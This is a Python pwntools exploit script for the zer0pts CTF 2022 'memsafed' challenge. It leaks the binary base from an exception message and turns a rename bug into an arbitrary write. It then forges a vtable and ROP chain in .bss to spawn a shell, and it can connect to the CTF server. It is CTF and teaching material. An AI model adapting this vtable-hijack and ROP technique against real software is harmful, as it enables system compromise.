#!/usr/bin/env python3

# References:
# https://kileak.github.io/ctf/2022/zer0pts-memsafed/

from pwn import *

the_binary = "./chall"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("pwn1.ctf.zer0pts.com", 9002)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def as_signed32(val):
    return u32(p32(val), signed=True)

def choice(idx):
    io.sendlineafter(b"> ", str(idx).encode())

def polygon_new(name, *vertices):
    choice(1)
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Number of vertices: ", str(len(vertices)).encode())
    for idx, vertex in enumerate(vertices):
        x, y = as_signed32(vertex[0]), as_signed32(vertex[1])
        io.sendlineafter(f"vertices[{idx}] = ".encode(), f"({x}, {y})".encode())

def polygon_show(name):
    choice(2)
    io.sendlineafter(b"Name: ", name)

def polygon_rename(old_name, new_name, is_overwrite=False):
    choice(3)
    io.sendlineafter(b"(old) Name: ", old_name)
    io.sendlineafter(b"(new) Name: ", new_name)

    if is_overwrite:
        io.sendlineafter(b"[y/N]: ", b"n")

def polygon_edit(name, idx, vertex):
    choice(4)

    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Index: ", str(idx).encode())

    x, y = as_signed32(vertex[0]), as_signed32(vertex[1])
    io.sendlineafter(f"vertices[{idx}] = ".encode(), f"({x}, {y})".encode())

def polygon_delete(name):
    choice(5)
    io.sendlineafter(b"Name: ", name)

polygon_new(b"A", [1, 2], [3, 4], [5, 6])

# Leak ELF address via exception info.
polygon_edit(b"A", 100, [1, 2])

io.recvuntil(b"??:? _Dmain [")
raw_elf_leak = io.recvuntil(b"]", drop=True)
elf_leak = int(raw_elf_leak, 16)
log.info("ELF leak: %#x" % elf_leak)
elf.address = elf_leak - 0xa21c5
log.info("ELF base: %#x" % elf.address)

# Due to improper handling of the temporary move in the polygon_rename
# function, the polygon named "A" should now be a polygon of zero-length.
# This zero-length primitive will cause bounds checks to wrap around,
# providing us with an arbitrary write primitive.
polygon_rename(b"A", b"A", is_overwrite=True)

def arb_write(where, what):
    aligned_where = align(8, where)
    if aligned_where != where:
        log.error("Can only do arbitrary writes to 8-byte aligned addresses")

    high_dword = (what >> 0x20) & 0xffffffff
    low_dword = what & 0xffffffff

    idx = aligned_where // 8
    polygon_edit(b"A", idx, [low_dword, high_dword])

class Addr:
    # nm -s ./chall | grep initZ | grep Polygon
    polygon_vtable = elf.sym._D27TypeInfo_HAyaS4main7Polygon6__initZ

    # nm ./chall | grep bss
    bss = elf.address + 0x0000000000167970

    rop_start = bss + 0x38

class Gadgets:
    # 0x00000000000a0b7f: add rsp, 0x18; ret;
    add_rsp_0x18 = elf.address + 0x00000000000a0b7f

    # grep 'pop rsp' gadgets.txt | grep rcx
    # 0x00000000000a459a: push rcx; or byte ptr [rax - 0x75], cl; pop rsp; and al, 8; add rsp, 0x18; ret;
    stack_pivot = elf.address + 0x00000000000a459a

    # 0x000000000011f893: pop rdi; ret;
    pop_rdi = elf.address + 0x000000000011f893

    # 0x000000000011f891: pop rsi; pop r15; ret;
    pop_rsi_r15 = elf.address + 0x000000000011f891

    # 0x0000000000107c56: pop rdx; xor eax, 0x89480001; ret;
    pop_rdx = elf.address + 0x0000000000107c56

    # 0x00000000000aa2cd: pop rax; ret;
    pop_rax = elf.address + 0x00000000000aa2cd

    # 0x00000000000d1ab1: syscall;
    syscall = elf.address + 0x00000000000d1ab1

# We setup a fake vtable in .bss, which we will use as a stack pivot
# trampoline into a full ROP chain.
fake_vtable = {
    0x0: Addr.bss,
    0x18: Gadgets.add_rsp_0x18,
    0x28: Gadgets.stack_pivot,
}
for offset, what in fake_vtable.items():
    arb_write(Addr.bss + offset, what)

# Write our ROP chain just below the fake vtable, which will adjust the stack
# to properly return into this chain.
null_ptr = Addr.rop_start + 8*4
rop = [
    Gadgets.pop_rdi,
    0xdeadbeef,
    Gadgets.pop_rsi_r15,
    null_ptr,
    0,
    Gadgets.pop_rdx,
    null_ptr,
    Gadgets.pop_rax,
    constants.SYS_execve,
    Gadgets.syscall,
    u64(b"/bin/sh\x00"),
]
# Update .bss pointers in ROP chain.
rop[1] = Addr.rop_start + 8*(len(rop)-1)
for idx, gadget in enumerate(rop):
    arb_write(Addr.rop_start + idx*8, gadget)

# Overwrite the Polygon vtable to point to the fake vtable we wrote to .bss.
arb_write(Addr.polygon_vtable + 0x18, Addr.bss)

# Trigger vtable resolution of forged function pointer by creating a new
# Poylgon.
polygon_new(b"B", [1, 2], [3, 4], [5, 6])

io.interactive()
